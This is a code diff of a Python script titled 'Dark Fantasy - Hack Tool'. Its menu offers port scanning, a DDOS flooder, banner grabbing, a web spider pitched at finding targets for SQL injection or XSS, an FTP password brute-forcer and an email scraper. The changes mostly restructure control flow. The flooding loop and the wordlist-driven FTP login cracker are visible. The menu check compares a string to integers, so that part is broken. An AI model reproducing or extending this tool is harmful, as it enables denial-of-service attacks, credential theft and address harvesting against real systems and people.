@@ -60,7 +60,6 @@ def dos(host):
         s.send("Host: "+host+"\r\n")
         s.send("User-Agent: "+choice(user_agents)+"\r\n\r\n")
         s.close()
-    main()
 
 
 def scanner(host):
@@ -83,21 +82,16 @@ def scanner(host):
             sock.close()
 
     except KeyboardInterrupt:
-        print("You pressed Ctrl+C")
-        main()
-
+        return print("You pressed Ctrl+C")
     except socket.gaierror:
-        print('Hostname could not be resolved. Exiting')
-        main()
-
+        return print('Hostname could not be resolved. Exiting')
     except socket.error:
-        print("Couldn't connect to server")
-        main()
+        return print("Couldn't connect to server")
+
     t2 = datetime.now()
     timetaken = t2-t1
     print("[*] Scanning ended at: "+str(t2)+"\n")
     print("[*] Time taken= "+str(timetaken))
-    main()
 
 
 def banner(host):
@@ -121,8 +115,6 @@ def banner(host):
     except:
         print("Connection failed")
 
-    main()
-
 
 def ftp(server):
     clear_scr()
@@ -143,13 +135,11 @@ def ftp(server):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         except:
-            print("Unable to create Socket.")
-            main()
+            return print("Unable to create Socket.")
         try:
             s.connect((server, 21))
         except:
-            print("Unable To Connect.")
-            main()
+            return print("Unable To Connect.")
         data = s.recv(1024)
         s.send('USER ' + username + '\r\n')
         data = s.recv(1024)
@@ -162,8 +152,7 @@ def ftp(server):
         print("[*] Tried: "+password+"\n")
         if "230" in data:
             print("password found\n")
-            print("[*] Password is: " + password)
-            main()
+            return print("[*] Password is: " + password)
         else:
             print('[*] '+password+" is incorrect")
     print("No password Found. Try another word list or username.")
@@ -172,11 +161,6 @@ def ftp(server):
 def spider(host):
     clear_scr()
 
-    spider1(host)
-    main()
-
-
-def spider1(host):
     print("[*] Use the result to find promising URLs/Emails to try hacking using SQL injection or Xss or Social Engineering etc.\n[*] Depth is the level to go inside the website( usually a small integer ).\n[*] Output will also be saved in text files in the same folder as this software.\n")
     depth = input("Enter the depth level in numbers: ")
     count = 1
@@ -215,7 +199,7 @@ def spider1(host):
 def email(host):
     clear_scr()
 
-    depth = spider1(host)
+    depth = input("Enter the depth level in numbers: ")
     count = 1
     emails = open("emails.txt", "w+")
     print("[*] Email addresses found on page: ")
@@ -223,8 +207,7 @@ def email(host):
         text = open("depth"+str(count)+".txt", "r")
         f = text.read()
         if f == "":
-            print("\n****Finished****")
-            main()
+            return print("\n****Finished****")
         f = f.split("\n")
         for j in f:
             try:
@@ -251,7 +234,6 @@ def email(host):
                     emails.write(line+"\n")
 
         count += 1
-    main()
 
 
 def ask_host():
@@ -263,29 +245,34 @@ def ask_host():
 
 
 def main():
-    print("-"*60+"\n")
-    print("                  Dark Fantasy - Hack Tool                    ")
-    print("-"*60+"\n")
-    print("1.Port Scanning\n2.DDOS\n3.Banner Grabbing\n4.Web spider(gather all URLs for web hacking)\n5.FTP Password Cracker\n6.Email Scraping")
-    choice = input("Enter Your Choice: ")
-    if choice not in range(6):
-        return print('Bye!')
+    while 1:
+        print("-"*60+"\n")
+        print("                  Dark Fantasy - Hack Tool                    ")
+        print("-"*60+"\n")
+        print("1.Port Scanning\n2.DDOS\n3.Banner Grabbing\n4.Web spider(gather all URLs for web hacking)\n5.FTP Password Cracker\n6.Email Scraping")
+        try:
+            choice = input("Enter Your Choice: ")
+        except (EOFError, KeyboardInterrupt):
+            return print('\n[!] Interrupted!')
 
-    hostname = ask_host()
-    if choice == '1':
-        scanner(hostname)
-    elif choice == '6':
-        email(hostname)
-    elif choice == '3':
-        banner(hostname)
-    elif choice == '5':
-        ftp(hostname)
-    elif choice == '2':
-        dos(hostname)
-    elif choice == '4':
-        spider(hostname)
-    else:
-        print("Wrong choice")
+        if choice not in range(6):
+            return print('Bye!')
+
+        hostname = ask_host()
+        if choice == '1':
+            scanner(hostname)
+        elif choice == '6':
+            email(hostname)
+        elif choice == '3':
+            banner(hostname)
+        elif choice == '5':
+            ftp(hostname)
+        elif choice == '2':
+            dos(hostname)
+        elif choice == '4':
+            spider(hostname)
+        else:
+            print("Wrong choice")
 
 
 if __name__ == '__main__':
